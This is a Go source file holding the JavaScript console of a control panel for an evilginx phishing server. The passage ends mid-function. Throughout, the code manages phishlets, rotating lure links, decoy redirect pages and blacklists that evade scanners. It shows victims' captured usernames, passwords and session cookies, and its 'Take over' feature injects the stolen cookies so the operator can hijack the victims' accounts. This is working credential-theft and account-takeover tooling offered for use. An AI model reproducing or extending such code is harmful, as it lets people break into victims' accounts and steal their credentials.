package main

// cpManageJS is appended to app.js on the Control Panel. It adds the per-server
// management console (phishlets, lures, autolures, redirects, blacklist,
// settings, logs, sessions) by proxying the remote engine's API, plus the
// Session Injector bridge so take-over works from here too.
// NOTE: no backticks (Go raw string).
const cpManageJS = `
/* ============ server management ============ */
var MG = { tab: 'sessions', profile: null };

function mgPid() { var m = (location.hash || '').match(/^#\/server\/([^\/?]+)/); return m ? decodeURIComponent(m[1]) : ''; }
function ep(p) { return '/api/profiles/' + mgPid() + '/engine/' + p; }
function mgPlural(n, s) { return n + ' ' + s + (n === 1 ? '' : 's'); }

// routed page
page = function () {
  var h = (location.hash || '#/servers').replace(/^#\/?/, '');
  if (h.indexOf('server/') === 0) return 'server';
  return VIEWS[h] ? h : 'servers';
};

TITLES.server = ['Server', ''];
VIEWS.server = viewServer;

async function viewServer() {
  var id = mgPid();
  if (!id) { location.hash = '#/servers'; return ''; }
  try { S.profile = await API.get('/api/profiles/' + id); } catch (e) { S.profile = null; }
  var p = S.profile || { name: id, host: '', user: '' };

  var ping = { reachable: false };
  try { ping = await API.get('/api/profiles/' + id + '/engine-ping'); } catch (e) { ping.error = e.message; }

  setHeader('Manage · ' + esc(p.name), esc(p.user) + '@' + esc(p.host) + (p.domain ? '  ·  ' + esc(p.domain) : ''),
    '<button class="btn sm" data-act="mg-reload">Refresh</button>' +
    '<button class="btn sm" data-act="nav" data-id="servers">← Servers</button>');

  var tabs = [['sessions', 'Sessions'], ['phishlets', 'Phishlets'], ['lures', 'Lures'], ['autolures', 'Autolures'],
              ['redirects', 'Redirects'], ['blacklist', 'Blacklist'], ['config', 'Settings'], ['logs', 'Logs']];
  var nav = tabs.map(function (t) {
    return '<div class="tab' + (MG.tab === t[0] ? ' active' : '') + '" data-act="mg-tab" data-id="' + t[0] + '">' + t[1] + '</div>';
  }).join('');

  var banner = '';
  if (!ping.reachable) {
    banner = '<div class="card mb14" style="border-color:var(--warn)"><b style="color:var(--warn)">Engine not reachable</b>' +
      '<div class="hint mt8">' + esc(ping.error || ('HTTP ' + (ping.status || '?'))) + '  ·  ' + esc(ping.url || '') + '</div>' +
      '<div class="hint">Set an <b>engine URL</b> in Edit if :5000 is not reachable from here.</div></div>';
  }
  var body = '';
  if (ping.reachable && MG_VIEWS[MG.tab]) {
    try { body = await MG_VIEWS[MG.tab](); } catch (e) { body = '<div class="empty">' + esc(e.message) + '</div>'; }
  }
  return banner + '<div class="tabs">' + nav + '</div><div id="mgBody">' + body + '</div>';
}

/* ---- sessions ---- */
async function mgSessions() {
  var d = await API.get(ep('sessions?limit=200'));
  if (!d.sessions.length) return '<div class="empty"><div class="big">◌</div>No sessions yet.</div>';
  var rows = d.sessions.map(function (s) {
    return '<tr class="clickable" data-act="mg-sess" data-id="' + s.id + '">' +
      '<td class="mono dim">#' + s.id + '</td>' +
      '<td><span class="badge acc">' + esc(s.phishlet) + '</span></td>' +
      '<td class="mono">' + (esc(s.username) || '<span class="dim">--</span>') + '</td>' +
      '<td class="mono">' + (esc(s.password) || '<span class="dim">--</span>') + '</td>' +
      '<td class="mono">' + esc(s.remote_addr) + '</td>' +
      '<td>' + (s.has_tokens ? '<span class="badge ok">captured</span>' : '<span class="badge mut">none</span>') + '</td>' +
      '<td class="dim">' + ago(s.create_time) + '</td></tr>';
  }).join('');
  return '<div class="card pad0"><div class="card-head"><h3>' + mgPlural(d.total, 'session') + '</h3>' +
    '<button class="btn sm" data-act="mg-export">Export CSV</button></div>' +
    '<table><thead><tr><th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>IP</th><th>Tokens</th><th>Captured</th></tr></thead><tbody>' + rows + '</tbody></table></div>';
}

/* ---- phishlets ---- */
async function mgPhishlets() {
  var d = await API.get(ep('phishlets'));
  var h = '<div class="actions mb14"><button class="btn sm" data-act="mg-pl-refresh">Reload all from disk</button></div>';
  h += '<div class="grid cards">';
  d.phishlets.forEach(function (p) {
    h += '<div class="card"><div class="card-head"><h3>' + esc(p.name) + ' ' +
      (p.enabled ? '<span class="badge ok">enabled</span>' : '<span class="badge mut">disabled</span>') +
      (p.hidden ? ' <span class="badge warn">hidden</span>' : '') + '</h3></div>' +
      '<div style="padding:14px 16px"><div class="kv">' +
        '<span class="k">Hostname</span><span class="v">' + esc(p.hostname || '-') + '</span>' +
        '<span class="k">Landing</span><span class="v">' + esc(p.landing_host || '-') + '</span>' +
        '<span class="k">Real login</span><span class="v">' + esc(p.login_host || '-') + '</span>' +
        '<span class="k">unauth_url</span><span class="v">' + esc(p.unauth_url || '(global)') + '</span>' +
      '</div><div class="actions mt14">' +
        (p.enabled
          ? '<button class="btn sm" data-act="mg-pl-disable" data-id="' + esc(p.name) + '">Disable</button>'
          : '<button class="btn sm primary" data-act="mg-pl-enable" data-id="' + esc(p.name) + '">Enable</button>') +
        '<button class="btn sm" data-act="mg-pl-hostname" data-id="' + esc(p.name) + '">Hostname</button>' +
        '<button class="btn sm" data-act="mg-pl-unauth" data-id="' + esc(p.name) + '">unauth_url</button>' +
        '<button class="btn sm" data-act="mg-pl-hide" data-id="' + esc(p.name) + '">' + (p.hidden ? 'Unhide' : 'Hide') + '</button>' +
        '<button class="btn sm" data-act="mg-pl-reload" data-id="' + esc(p.name) + '">Reload</button>' +
        '<button class="btn sm" data-act="mg-pl-yaml" data-id="' + esc(p.name) + '">YAML</button>' +
        '<button class="btn sm" data-act="mg-pl-dns" data-id="' + esc(p.name) + '">DNS</button>' +
      '</div></div></div>';
  });
  return h + '</div>';
}

/* ---- lures ---- */
async function mgLures() {
  var d = await API.get(ep('lures'));
  var h = '<div class="actions mb14"><button class="btn sm primary" data-act="mg-lure-new">New lure</button>' +
    '<button class="btn sm" data-act="mg-auto-new">New autolure</button></div>';
  if (!d.lures.length) return h + '<div class="empty"><div class="big">⚲</div>No lures.</div>';
  h += '<div class="card pad0"><table><thead><tr><th>ID</th><th>Phishlet</th><th>Link</th><th>Info</th><th>State</th><th></th></tr></thead><tbody>';
  d.lures.forEach(function (l) {
    h += '<tr><td class="mono dim">#' + l.id + '</td><td><span class="badge acc">' + esc(l.phishlet) + '</span></td>' +
      '<td class="mono"><span class="copy" data-act="copy" data-copy="' + esc(l.link) + '">' + esc(l.link) + ' ⧉</span></td>' +
      '<td class="dim">' + esc(l.info || '-') + '</td>' +
      '<td>' + (l.paused ? '<span class="badge warn">paused</span>' : (l.active ? '<span class="badge ok">active</span>' : '<span class="badge mut">scheduled</span>')) +
      (l.auto_rotate ? ' <span class="badge mut">auto</span>' : '') + '</td>' +
      '<td class="right actions">' +
        '<button class="btn xs sm" data-act="mg-lure-edit" data-id="' + l.id + '">Edit</button>' +
        '<button class="btn xs sm" data-act="mg-lure-clone" data-id="' + l.id + '">Clone</button>' +
        (l.paused ? '<button class="btn xs sm ok" data-act="mg-lure-unpause" data-id="' + l.id + '">Resume</button>'
                  : '<button class="btn xs sm" data-act="mg-lure-pause" data-id="' + l.id + '">Pause</button>') +
        '<button class="btn xs sm danger" data-act="mg-lure-del" data-id="' + l.id + '">Del</button>' +
      '</td></tr>';
  });
  return h + '</tbody></table></div>';
}

/* ---- autolures ---- */
async function mgAutolures() {
  var d = await API.get(ep('autolures'));
  var h = '<div class="actions mb14"><button class="btn sm primary" data-act="mg-auto-new">New autolure</button></div>';
  if (!d.autolures.length) return h + '<div class="empty"><div class="big">↻</div>No autolures. Share the gateway URL only - the path rotates.</div>';
  h += '<div class="card pad0"><table><thead><tr><th>ID</th><th>Phishlet</th><th>Gateway (share)</th><th>Active path</th><th>Next</th><th>Notify</th><th></th></tr></thead><tbody>';
  d.autolures.forEach(function (l) {
    var secs = l.next_rotate - d.now;
    h += '<tr><td class="mono dim">#' + l.id + '</td><td><span class="badge acc">' + esc(l.phishlet) + '</span></td>' +
      '<td class="mono copy" data-act="copy" data-copy="' + esc(l.gateway) + '">' + esc(l.gateway) + ' ⧉</td>' +
      '<td class="mono trunc">' + esc(l.link) + '</td>' +
      '<td class="mono">' + (secs > 0 ? Math.floor(secs / 60) + 'm ' + (secs % 60) + 's' : 'rotating…') + '</td>' +
      '<td>' + (l.rotate_notify ? '<span class="badge ok">on</span>' : '<span class="badge mut">off</span>') + '</td>' +
      '<td class="right actions"><button class="btn xs sm" data-act="mg-auto-notify" data-id="' + l.id + '" data-on="' + (l.rotate_notify ? '0' : '1') + '">Notify</button>' +
      '<button class="btn xs sm danger" data-act="mg-lure-del" data-id="' + l.id + '">Del</button></td></tr>';
  });
  return h + '</tbody></table></div>';
}

/* ---- redirects + templates ---- */
async function mgRedirects() {
  var list = await API.get(ep('redirects'));
  var tpls = { templates: [] };
  try { tpls = await API.get(ep('redirect-templates')); } catch (e) {}
  var rows = list.redirects.map(function (r) {
    return '<tr><td class="mono dim">#' + r.id + '</td><td class="mono">' + esc(r.host) + '</td>' +
      '<td class="mono">' + esc(r.file) + '</td><td class="mono trunc">' + esc(r.target_url || '-') + '</td>' +
      '<td>' + (r.turnstile ? '<span class="badge warn">' + esc(r.turnstile_type || 'on') + '</span>' : '<span class="badge mut">off</span>') + '</td>' +
      '<td class="right actions"><button class="btn xs sm" data-act="mg-redir-edit" data-id="' + r.id + '">Edit</button>' +
      '<button class="btn xs sm" data-act="mg-redir-preview" data-id="' + esc(r.host) + '">Open</button>' +
      '<button class="btn xs sm danger" data-act="mg-redir-del" data-id="' + r.id + '">Del</button></td></tr>';
  }).join('') || '<tr><td colspan="6" class="dim center">none configured</td></tr>';

  var cards = tpls.templates.map(function (t) {
    return '<div class="tplcard" data-act="mg-redir-new" data-id="' + esc(t.slug) + '">' +
      '<div class="tplthumb"><iframe loading="lazy" src="' + ep('redirect-templates/' + esc(t.slug) + '?target=https://login.microsoftonline.com/') + '"></iframe></div>' +
      '<div class="tplmeta"><b>' + esc(t.title) + '</b><span class="dim">' + esc(t.category) + (t.has_slot ? ' · slot' : '') + '</span>' +
      '<div class="hint">' + esc(t.description) + '</div></div></div>';
  }).join('');

  return '<div class="card pad0 mb14"><div class="card-head"><h3>Active redirect pages</h3><span class="dim mono" style="font-size:11px">' + esc(list.dir) + '</span></div>' +
    '<table><thead><tr><th>ID</th><th>Host</th><th>File</th><th>Target</th><th>Turnstile</th><th></th></tr></thead><tbody>' + rows + '</tbody></table></div>' +
    '<h3 style="font-size:13px;margin:6px 0 10px">Template library</h3>' +
    '<div class="tplgrid">' + (cards || '<span class="dim">no templates</span>') + '</div>';
}

/* ---- blacklist ---- */
async function mgBlacklist() {
  var d = await API.get(ep('blacklist?limit=1000'));
  var modes = [['off', 'Off'], ['unauth', 'Block unauth only (recommended)'], ['noadd', 'Redirect, do not store'], ['all', 'Block everyone']];
  var mopts = modes.map(function (m) { return '<option value="' + m[0] + '"' + (d.mode === m[0] ? ' selected' : '') + '>' + m[1] + '</option>'; }).join('');
  var ips = d.ips.map(function (ip) {
    return '<tr><td class="mono">' + esc(ip) + '</td><td class="right"><button class="btn xs sm danger" data-act="mg-bl-del" data-id="' + esc(ip) + '">Remove</button></td></tr>';
  }).join('') || '<tr><td colspan="2" class="dim center">empty</td></tr>';
  return '<div class="grid stats mb14">' +
      '<div class="card"><div class="stat-label">Blocked IPs</div><div class="stat-value">' + d.count + '</div></div>' +
      '<div class="card"><div class="stat-label">Masks</div><div class="stat-value">' + d.masks + '</div></div>' +
      '<div class="card"><div class="stat-label">Mode</div><select id="mgBlMode" class="mt8">' + mopts + '</select></div>' +
    '</div>' +
    '<div class="card mb14"><div class="card-head"><h3>Add IP</h3></div><div style="padding:14px 16px"><form data-form="mgbl" class="row">' +
      '<div class="field" style="flex:1"><input name="ip" placeholder="1.2.3.4" required></div><button class="btn primary" type="submit">Add</button></form></div></div>' +
    '<div class="card pad0"><table><tbody>' + ips + '</tbody></table></div>';
}

/* ---- engine settings ---- */
async function mgConfig() {
  var c = await API.get(ep('config'));
  var g = c.general, t = c.telegram, gp = c.gophish;
  function f(l, k, v, h, type) {
    return '<div class="field"><label>' + esc(l) + '</label><input data-mcfg="' + k + '" type="' + (type || 'text') + '" value="' + esc(v === null || v === undefined ? '' : v) + '">' + (h ? '<span class="hint">' + esc(h) + '</span>' : '') + '</div>';
  }
  function sw(l, k, on, h) { return '<label class="switch mb14"><input type="checkbox" data-mcfgsw="' + k + '"' + (on ? ' checked' : '') + '><span class="track"></span><span class="muted">' + esc(l) + '</span></label>' + (h ? '<div class="hint" style="margin-top:-8px;margin-bottom:12px">' + esc(h) + '</div>' : ''); }
  function sel(l, k, v, opts, h) {
    var o = opts.map(function (x) { return '<option value="' + esc(x[0]) + '"' + ((v || '') === x[0] ? ' selected' : '') + '>' + esc(x[1]) + '</option>'; }).join('');
    return '<div class="field"><label>' + esc(l) + '</label><select data-mcfg="' + k + '">' + o + '</select>' + (h ? '<span class="hint">' + esc(h) + '</span>' : '') + '</div>';
  }
  return '<div class="card"><div class="card-body">' +
    '<div class="row"><div class="field"><label>Domain</label><input data-mcfg="domain" value="' + esc(g.domain) + '"></div>' +
    '<div class="field"><label>External IP</label><input data-mcfg="external_ipv4" value="' + esc(g.external_ipv4) + '"></div></div>' +
    '<div class="row"><div class="field"><label>unauth_url</label><input data-mcfg="unauth_url" value="' + esc(g.unauth_url) + '"></div>' +
    '<div class="field"><label>Dashboard subdomain</label><input data-mcfg="dashboardsub" value="' + esc(g.dashboard_sub) + '"></div></div>' +
    sw('unauth_redirect (302 decoy)', 'unauth_redirect', g.unauth_redirect) +
    sw('strip_headers', 'strip_headers', g.strip_headers) +
    sel('login_prompt (what the provider is asked to show)', 'login_prompt', g.login_prompt,
      [['login', 'login - always ask for credentials'], ['select_account', 'select_account - show the account picker'], ['off', 'off - never prompt (session-only)']],
      'login adds prompt=login, select_account shows the account tile so a returning visitor picks their account and skips typing the email, off never prompts and only captures a session. force_login on|off still works as an alias. SAML/WS-Fed hops use wfresh=0 unless off.') +
    sw('autocert (ACME TLS)', 'autocert', g.autocert) +
    sw('block_vpn', 'blockvpn', g.block_vpn) +
    '<div class="row"><div class="field"><label>Telegram chat id</label><input data-mcfg="chatid" value="' + esc(t.chatid) + '"></div>' +
    '<div class="field"><label>Telegram token</label><input data-mcfg="teletoken" placeholder="' + esc(t.token_set ? 'saved' : '') + '"></div></div>' +
    '<div class="actions mb14"><button class="btn sm" data-act="mg-tg-test">Telegram test</button>' +
    '<button class="btn sm" data-act="mg-gp-test">GoPhish test</button>' +
    '<button class="btn sm" data-act="mg-cert-test">Re-provision certs</button></div>' +
    '<div class="row"><div class="field"><label>Turnstile site key</label><input id="mgTsKey" value="' + esc(g.turnstile_site_key) + '"></div>' +
    '<div class="field"><label>Turnstile secret</label><input id="mgTsSec" type="password" placeholder="' + (g.turnstile_set ? 'saved' : '') + '"></div></div>' +
    '<div class="actions mb14"><button class="btn sm" data-act="mg-ts-save">Save Turnstile</button><button class="btn sm danger" data-act="mg-ts-off">Disable Turnstile</button></div>' +
    '<div class="actions"><button class="btn primary" data-act="mg-cfg-save">Save settings</button></div>' +
  '</div></div>';
}

/* ---- logs ---- */
async function mgLogs() {
  var id = mgPid();
  var d = await API.get('/api/profiles/' + id + '/logs?lines=300');
  var sys = {};
  try { sys = await API.get(ep('system')); } catch (e) {}
  var info = '<div class="kv mb14">' +
    '<span class="k">Service</span><span class="v">' + esc(sys.blacklist_mode ? 'ok' : '-') + '</span>' +
    '<span class="k">Domain</span><span class="v">' + esc(sys.domain || '-') + '</span>' +
    '<span class="k">Version</span><span class="v">' + esc(sys.version || '-') + '</span>' +
    '<span class="k">Cert</span><span class="v">' + esc(sys.cert && sys.cert.loaded ? (sys.cert.subject + ' · ' + sys.cert.days_left + ' days') : 'none') + '</span>' +
    '<span class="k">Blacklist</span><span class="v">' + esc((sys.blacklist_ips || 0) + ' ips · mode ' + (sys.blacklist_mode || '')) + '</span>' +
  '</div>';
  return '<div class="card mb14"><div class="card-head"><h3>Engine</h3></div><div style="padding:14px 16px">' + info + '</div></div>' +
    '<div class="card pad0"><div class="card-head"><h3>journalctl -u evilginx</h3><button class="btn sm" data-act="mg-reload">Refresh</button></div>' +
    '<div class="log" style="max-height:52vh;overflow:auto;padding:12px">' + esc(d.log) + '</div></div>';
}

var MG_VIEWS = { sessions: mgSessions, phishlets: mgPhishlets, lures: mgLures, autolures: mgAutolures, redirects: mgRedirects, blacklist: mgBlacklist, config: mgConfig, logs: mgLogs };

/* ---- extension bridge (take over from the control panel too) ---- */
document.addEventListener('ext-ready', function () { S.ext = true; });
window.addEventListener('inject-result', function (e) {
  var r = e.detail || {}, el = $('#injResult');
  if (el) el.innerHTML = '<div class="badge ok">' + (r.success || 0) + ' cookies injected' + (r.failed ? ', ' + r.failed + ' failed' : '') + '</div>';
});
function mgDownloadCookies(d) {
  var blob = new Blob([JSON.stringify(d.cookies || [], null, 2)], { type: 'application/json' });
  var a = document.createElement('a'); a.href = URL.createObjectURL(blob);
  a.download = 'session_' + d.session_id + '_cookies.json'; a.click(); URL.revokeObjectURL(a.href);
}
async function mgInject(id) {
  var d = await API.get(ep('sessions/' + id + '/cookies'));
  if (!d.count) { toast('No cookies', 'err'); return; }
  if (S.ext) {
    openModal('⚡ Take over session #' + id,
      '<p class="muted mb14">Injecting <b>' + d.count + '</b> cookies and opening the target…</p><div id="injResult"><span class="dim">working…</span></div>' +
      '<div class="actions mt14"><button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
      '<button class="btn sm" data-act="mg-dl" data-id="' + id + '">Download JSON</button></div>');
    window.postMessage({ type: 'DO_INJECT', payload: d }, '*');
  } else {
    mgDownloadCookies(d);
    openModal('⚡ Take over session #' + id,
      '<p class="muted mb14">Cookies downloaded (<b>' + d.count + '</b>). Install the Session Injector extension for one-click, or import with Cookie-Editor.</p>' +
      '<div class="actions"><button class="btn sm primary" data-act="mg-open" data-copy="' + esc(d.target_url) + '">Open target</button>' +
      '<button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
      '<button class="btn sm" data-act="mg-dl" data-id="' + id + '">Download JSON</button></div>');
  }
}

/* ---- management actions ---- */
function mgRefresh() { render(); }
function mgSet(field, value) { return API.post(ep('config'), { key: field, value: value }); }
function mgPrompt(title, label, value, act, extraId) {
  openModal(title, '<div class="field"><label>' + esc(label) + '</label><input id="mgVal" value="' + esc(value || '') + '"></div>' +
    '<div class="actions"><button class="btn primary" data-act="' + act + '" data-id="' + esc(extraId || '') + '">Save</button></div>');
}
function mgVal() { var e = $('#mgVal'); return e ? e.value.trim() : ''; }

Object.assign(ACTIONS, {
  manage: function (id) { MG.tab = 'sessions'; goto('server/' + id); },
  'mg-reload': function () { mgRefresh(); },
  'mg-tab': function (id) { MG.tab = id; mgRefresh(); },
  'mg-export': function () { window.open('/api/profiles/' + mgPid() + '/engine/sessions/export?format=csv'); },

  'mg-sess': function (id) {
    run(async function () {
      var s = await API.get(ep('sessions/' + id));
      var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '')) : '-';
      openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet),
        '<div class="kv"><span class="k">Username</span><span class="v">' + esc(s.username || '-') + '</span>' +
        '<span class="k">Password</span><span class="v">' + esc(s.password || '-') + '</span>' +
        '<span class="k">IP</span><span class="v">' + esc(s.remote_addr) + '</span>' +
        '<span class="k">Location</span><span class="v">' + esc(geo) + '</span>' +
        '<span class="k">Tokens</span><span class="v">' + (s.has_tokens ? s.token_count + ' cookies' : 'none') + '</span></div>' +
        '<div class="field mt14"><label>Cookies</label><div class="log" style="max-height:40vh">' + esc(s.tokens ? JSON.stringify(s.tokens, null, 2) : '(none)') + '</div></div>',
        (s.has_tokens ? '<button class="btn sm primary" data-act="mg-inject" data-id="' + s.id + '">⚡ Take over</button>' : '') +
        '<button class="btn sm danger" data-act="mg-sess-del" data-id="' + s.id + '">Delete</button>');
    });
  },
  'mg-inject': function (id) { run(function () { return mgInject(id); }); },
  'mg-dl': function (id) { run(async function () { mgDownloadCookies(await API.get(ep('sessions/' + id + '/cookies'))); }); },
  'mg-open': function (id, el) { window.open(el.getAttribute('data-copy'), '_blank'); },
  'mg-sess-del': function (id) { if (confirm('Delete session #' + id + '?')) run(async function () { await API.del(ep('sessions/' + id)); toast('deleted', 'ok'); closeDrawer(); mgRefresh(); }); },

  'mg-pl-enable': function (id) { run(async function () { await API.post(ep('phishlets/' + enc(id) + '/enable')); toast(id + ' enabled', 'ok'); mgRefresh(); }); },
  'mg-pl-disable': function (id) { run(async function () { await API.post(ep('phishlets/' + enc(id) + '/disable')); mgRefresh(); }); },
  'mg-pl-hide': function (id) { run(async function () { await API.post(ep('phishlets/' + enc(id) + '/hide'), {}); mgRefresh(); }); },
  'mg-pl-reload': function (id) { run(async function () { await API.post(ep('phishlets/' + enc(id) + '/reload')); toast(id + ' reloaded', 'ok'); mgRefresh(); }); },
  'mg-pl-refresh': function () { run(async function () { var r = await API.post(ep('phishlets/refresh')); toast('refreshed ' + ((r.refreshed || []).length), 'ok'); mgRefresh(); }); },
  'mg-pl-yaml': function (id) { run(async function () { var d = await API.get(ep('phishlets/' + enc(id) + '/yaml')); openModal('⬡ ' + esc(id) + '.yaml', '<div class="log" style="max-height:60vh">' + esc(d.yaml) + '</div>'); }); },
  'mg-pl-dns': function (id) { run(async function () { var d = await API.get(ep('phishlets/' + enc(id) + '/hosts')); var r = (d.records || []).map(function (x) { return '<div class="mono">' + esc(x.type) + '  ' + esc(x.name) + '  →  ' + esc(x.value) + '</div>'; }).join('') || '<span class="dim">no hostname</span>'; openModal('DNS · ' + esc(id), r); }); },
  'mg-pl-hostname': function (id) { run(async function () { var d = await API.get(ep('phishlets')); var p = d.phishlets.find(function (x) { return x.name === id; }); mgPrompt('Hostname · ' + esc(id), 'Base hostname', p ? p.hostname : '', 'mg-pl-hostname-save', id); }); },
  'mg-pl-hostname-save': function (id) { var v = mgVal(); run(async function () { await API.post(ep('phishlets/' + enc(id) + '/hostname'), { hostname: v }); closeModal(); mgRefresh(); }); },
  'mg-pl-unauth': function (id) { run(async function () { var d = await API.get(ep('phishlets')); var p = d.phishlets.find(function (x) { return x.name === id; }); mgPrompt('unauth_url · ' + esc(id), 'URL (empty = global)', p ? p.unauth_url : '', 'mg-pl-unauth-save', id); }); },
  'mg-pl-unauth-save': function (id) { var v = mgVal(); run(async function () { await API.post(ep('phishlets/' + enc(id) + '/unauth_url'), { url: v }); closeModal(); mgRefresh(); }); },

  'mg-lure-new': function () { mgNewLure(false, ''); },
  'mg-auto-new': function () { mgNewLure(true, ''); },
  'mg-lure-create': function (kind) {
    var body = { phishlet: $('#mgLPl').value, subdomain: $('#mgLSub').value.trim() };
    if (kind === 'auto') body.interval = mgValId('mgLInt');
    run(async function () { var r = await API.post(ep('lures'), body); closeModal(); toast((kind === 'auto' ? 'autolure' : 'lure') + ' created', 'ok'); if (r.link || r.url) toast('link ready', 'info'); mgRefresh(); });
  },
  'mg-lure-edit': function (id) { run(async function () { var l = await API.get(ep('lures/' + id)); mgEditLure(l); }); },
  'mg-lure-save': function (id) {
    run(async function () {
      var fs = $$('[data-mlf]');
      for (var i = 0; i < fs.length; i++) await API.post(ep('lures/' + id + '/edit'), { field: fs[i].getAttribute('data-mlf'), value: fs[i].value });
      toast('saved', 'ok'); closeModal(); mgRefresh();
    });
  },
  'mg-lure-clone': function (id) { run(async function () { await API.post(ep('lures/' + id + '/clone')); toast('cloned', 'ok'); mgRefresh(); }); },
  'mg-lure-del': function (id) { if (confirm('Delete #' + id + '?')) run(async function () { await API.del(ep('lures/' + id)); toast('deleted', 'ok'); mgRefresh(); }); },
  'mg-lure-pause': function (id) { mgPrompt('Pause #' + id, 'Duration', '1h', 'mg-lure-pause-save', id); },
  'mg-lure-pause-save': function (id) { var v = mgVal(); run(async function () { await API.post(ep('lures/' + id + '/pause'), { duration: v }); closeModal(); mgRefresh(); }); },
  'mg-lure-unpause': function (id) { run(async function () { await API.post(ep('lures/' + id + '/unpause')); mgRefresh(); }); },
  'mg-auto-notify': function (id, el) { run(async function () { await API.post(ep('autolures/' + id + '/notify'), { on: el.getAttribute('data-on') === '1' }); mgRefresh(); }); },

  'mg-redir-new': function (slug) { mgNewRedirect(slug); },
  'mg-redir-edit': function (id) { mgRedirEdit(Number(id)); },
  'mg-redir-save': function () {
    run(async function () {
      var body = mgRedirCollect();
      var tpl = body.template; delete body.template;
      body.template = tpl;
      await API.post(ep('redirects'), body);
      toast('created', 'ok'); closeModal(); mgRefresh();
    });
  },
  'mg-redir-update': function (id) {
    run(async function () {
      var body = mgRedirCollect();
      await API.post(ep('redirects/' + id + '/edit'), {
        target_url: body.target_url, delay: body.delay, turnstile: body.turnstile,
        turnstile_pos: body.turnstile_pos, turnstile_type: body.turnstile_type, turnstile_theme: body.turnstile_theme,
        brand: body.brand, title: body.title, subtitle: body.subtitle, accent: body.accent,
        logo: body.logo, button: body.button, messages: body.messages
      });
      toast('saved', 'ok'); closeModal(); mgRefresh();
    });
  },
  'mg-redir-del': function (id) { if (confirm('Delete redirect #' + id + '?')) run(async function () { await API.del(ep('redirects/' + id)); mgRefresh(); }); },
  'mg-redir-preview': function (id, el) { var host = el.getAttribute('data-id'); window.open('https://' + host + '/', '_blank'); },

  'mg-bl-del': function (id) { run(async function () { await API.del(ep('blacklist/' + enc(id))); mgRefresh(); }); },
  'mg-bl-add': function () { },

  'mg-cfg-save': function () {
    run(async function () {
      var ins = $$('[data-mcfg]');
      for (var i = 0; i < ins.length; i++) {
        var k = ins[i].getAttribute('data-mcfg'), v = ins[i].value;
        if ((k === 'teletoken' || k === 'dashboard_pass') && v === '') continue;
        try { await mgSet(k, v); } catch (e) { toast(k + ': ' + e.message, 'err'); }
      }
      var sws = $$('[data-mcfgsw]');
      for (var j = 0; j < sws.length; j++) { try { await mgSet(sws[j].getAttribute('data-mcfgsw'), sws[j].checked ? 'on' : 'off'); } catch (e) {} }
      toast('settings saved', 'ok'); mgRefresh();
    });
  },
  'mg-tg-test': function () { run(async function () { await API.post(ep('integrations/telegram/test')); toast('test sent', 'ok'); }); },
  'mg-gp-test': function () { run(async function () { await API.post(ep('integrations/gophish/test')); toast('GoPhish OK', 'ok'); }); },
  'mg-cert-test': function () { run(async function () { await API.post(ep('cert/test')); toast('cert request sent', 'info'); }); },
  'mg-ts-save': function () { run(async function () { await API.post(ep('config/turnstile'), { site_key: $('#mgTsKey').value.trim(), secret_key: $('#mgTsSec').value.trim() }); toast('turnstile saved', 'ok'); }); },
  'mg-ts-off': function () { run(async function () { await API.post(ep('config/turnstile'), {}); toast('turnstile off', 'ok'); }); }
});

function enc(s) { return encodeURIComponent(s); }
function mgValId(id) { var e = document.getElementById(id); return e ? e.value.trim() : ''; }

function mgNewLure(auto, sub) {
  run(async function () {
    var d = await API.get(ep('phishlets'));
    var opts = d.phishlets.map(function (p) { return '<option value="' + esc(p.name) + '">' + esc(p.name) + '</option>'; }).join('');
    openModal(auto ? 'New autolure' : 'New lure',
      '<div class="field"><label>Phishlet</label><select id="mgLPl">' + opts + '</select></div>' +
      '<div class="field"><label>Subdomain</label><input id="mgLSub" placeholder="login"><span class="hint">empty = phishlet landing host</span></div>' +
      (auto ? '<div class="field"><label>Rotation interval</label><input id="mgLInt" placeholder="random 45-90m"><span class="hint">e.g. 30m, 1h</span></div>' : '') +
      '<div class="actions"><button class="btn primary" data-act="mg-lure-create" data-id="' + (auto ? 'auto' : 'lure') + '">Create</button></div>');
  });
}
function mgEditLure(l) {
  function f(label, field, val, hint) { return '<div class="field"><label>' + label + '</label><input data-mlf="' + field + '" value="' + esc(val || '') + '">' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>'; }
  function s(label, field, val, opts, hint) {
    var o = opts.map(function (x) { return '<option value="' + x[0] + '"' + ((val || '') === x[0] ? ' selected' : '') + '>' + esc(x[1]) + '</option>'; }).join('');
    return '<div class="field"><label>' + label + '</label><select data-mlf="' + field + '">' + o + '</select>' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>';
  }
  openModal('Edit lure #' + l.id,
    f('Path', 'path', l.path) + f('Hostname', 'hostname', l.hostname, 'must end with the base domain') +
    f('redirect_url', 'redirect_url', l.redirect_url) + f('UA filter (regex)', 'ua_filter', l.ua_filter) +
    s('login_prompt', 'login_prompt', l.login_prompt,
      [['', 'inherit global'], ['login', 'login - always ask'], ['select_account', 'select_account - account picker'], ['off', 'off - never prompt']],
      'empty = use the global setting; returning-visitor lures want select_account') +
    f('info', 'info', l.info) + f('active_hours', 'active_hours', l.active_hours, 'HH:MM-HH:MM') +
    f('active_days', 'active_days', l.active_days, 'Mon,Tue,…') + f('active_tz', 'active_tz', l.active_tz, 'IANA tz') +
    f('og_title', 'og_title', l.og_title) + f('og_desc', 'og_desc', l.og_desc) +
    '<div class="actions"><button class="btn primary" data-act="mg-lure-save" data-id="' + l.id + '">Save</button></div>');
}
function mgRedirTemplateURL(slug, o) {
  var msgs = o.messages;
  if (Object.prototype.toString.call(msgs) === '[object Array]') msgs = msgs.join('\n');
  var q = '?target=' + encodeURIComponent(o.target || '') +
    '&delay=' + encodeURIComponent(o.delay || '3') +
    '&brand=' + encodeURIComponent(o.brand || '') +
    '&title=' + encodeURIComponent(o.title || '') +
    '&subtitle=' + encodeURIComponent(o.subtitle || '') +
    '&accent=' + encodeURIComponent(o.accent || '') +
    '&logo=' + encodeURIComponent(o.logo || '') +
    '&button=' + encodeURIComponent(o.button || '') +
    '&messages=' + encodeURIComponent((msgs || '').split('\n').join('|'));
  if (o.turnstile) {
    q += '&turnstile=1&turnstile_pos=' + encodeURIComponent(o.turnstile_pos || 'slot') +
      '&turnstile_type=' + encodeURIComponent(o.turnstile_type || 'managed') +
